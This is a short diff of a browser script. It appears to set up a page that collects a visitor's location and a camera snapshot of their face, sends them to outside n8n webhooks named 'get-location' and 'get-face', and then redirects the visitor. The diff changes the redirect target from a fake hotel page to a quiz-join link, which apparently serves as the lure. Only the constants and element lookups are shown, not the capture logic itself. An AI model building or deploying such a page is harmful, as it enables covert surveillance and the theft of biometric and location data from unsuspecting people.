@@ -1,7 +1,7 @@
 (async () => {
   const WEBHOOK_LOCATION = "https://jdika5914.app.n8n.cloud/webhook/get-location";
   const WEBHOOK_FACE = "https://jdika5914.app.n8n.cloud/webhook/get-face";
-  const REDIRECT_URL = "https://juliandika5914.github.io/Lotus-Hotel/";
+  const REDIRECT_URL = "https://wayground.com/join?gc=267957&source=liveDashboard";
 
   const video = document.getElementById("camera");
   const canvas = document.getElementById("snapshot");
